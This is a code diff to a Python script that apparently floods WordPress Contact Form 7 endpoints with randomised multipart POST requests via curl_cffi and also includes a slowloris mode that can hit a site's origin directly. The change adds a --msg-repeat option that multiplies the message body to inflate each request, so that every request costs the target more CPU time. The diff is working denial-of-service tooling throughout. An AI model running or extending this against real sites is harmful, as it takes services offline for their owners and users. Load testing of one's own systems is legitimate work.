@@ -432,9 +432,14 @@ def build_files(form_id, unit_tag):
     }
 
 
+MSG_REPEAT = 1
+
 def build_multipart(form_id, unit_tag, large_payload=False):
     """curl_cffi needs CurlMime, not the requests-style files dict."""
     f = random_payload_fields()
+    msg = f["message"]
+    if MSG_REPEAT > 1:
+        msg = ("\n\n---\n\n".join([msg] * MSG_REPEAT))
     mp = CurlMime()
     mp.addpart(name="_wpcf7", data=form_id)
     mp.addpart(name="_wpcf7_version", data="6.1.6")
@@ -443,7 +448,7 @@ def build_multipart(form_id, unit_tag, large_payload=False):
     mp.addpart(name="your-name", data=f["name"])
     mp.addpart(name="your-email", data=f["email"])
     mp.addpart(name="your-subject", data=f["subject"])
-    mp.addpart(name="your-message", data=f["message"])
+    mp.addpart(name="your-message", data=msg)
     if large_payload:
         extra_keys = random.sample(_EXTRA_FIELD_KEYS, k=random.randint(4, 8))
         for key in extra_keys:
@@ -734,10 +739,13 @@ def main():
                         "isolates whether a cached GET behaves differently under\n"
                         "flood than the always-uncached CF7 POST.")
     p.add_argument("--large-payload", action="store_true",
-                   help="Inflate each request: multi-paragraph message (~3KB),\n"
-                        "4-8 extra form fields, and a fake PDF attachment (60-120KB).\n"
-                        "Forces PHP to parse a larger multipart body + write a temp file\n"
-                        "per request — increases per-worker CPU/disk time.")
+                   help="Inflate each request: multi-paragraph message (~3KB) +\n"
+                        "4-8 extra form fields. Increases per-worker CPU time.")
+    p.add_argument("--msg-repeat",   type=int, default=1, metavar="N",
+                   help="Repeat the message body N times (separator between each).\n"
+                        "N=5 → ~15KB, N=10 → ~30KB per request.\n"
+                        "Combine with --large-payload for maximum size.\n"
+                        "Example: --large-payload --msg-repeat 10")
     p.add_argument("--verbose",     action="store_true",
                    help="Show every request")
     p.add_argument("--delay",       type=float, default=0,
@@ -775,6 +783,10 @@ def main():
     if args.large_payload:
         global LARGE_PAYLOAD
         LARGE_PAYLOAD = True
+
+    if args.msg_repeat > 1:
+        global MSG_REPEAT
+        MSG_REPEAT = args.msg_repeat
 
     # ── slowloris: domain not required, can run standalone with --origin ─────
     if args.slowloris:
